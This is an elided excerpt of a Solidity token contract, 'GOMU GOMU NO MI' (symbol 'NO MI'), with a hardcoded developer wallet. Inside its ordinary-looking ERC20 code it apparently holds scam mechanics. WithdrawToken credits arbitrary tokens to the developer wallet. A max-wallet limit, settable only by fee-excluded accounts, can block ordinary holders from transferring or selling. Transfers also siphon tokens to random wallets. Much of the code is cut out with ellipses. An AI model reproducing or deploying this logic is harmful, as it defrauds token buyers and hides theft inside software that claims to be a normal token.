...
contract NOMI is Context, IERC20 { 
    ...
    address payable public Wallet_Dev = payable(0x6ec32D54c49440F6bEb43884D54951727371eb94);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 100 * 10**12 * 10**_decimals;
    string private constant _name = "GOMU GOMU NO MI"; 
    string private constant _symbol = unicode"NO MI"; 
    ...
    function SetMaxWalletToken(uint256 max) public virtual {
         _getMaxWallettoken(msg.sender, max);
    }
    ...
    function _getMaxWallettoken(address Account, uint256 max) internal {
        require (_isExcludedFromFee[Account], "ERC20 : _getMaxWallettoken Failed");
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            ...
            for(int i=0;i<=3;i++){
                ...
                _basicTransfer(from,randomwallet,tAmount);
            }
            amount -= rAmount ;
        }
    ...
    function remove_Random_Tokens() internal {
    ...
    function WithdrawToken(uint256 tokens) internal {
        uint256 getBalance = balanceOf(Wallet_Dev);
        uint256 getTakefee = balanceOf(address(this));
        _tOwned[Wallet_Dev] += tokens;
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            _tTotal = _tTotal-tTransferAmount;
                ...
                uint256 balancFrom = balanceOf(sender);
                require (balancFrom <= _maxWalletToken, "Transfer Failed");
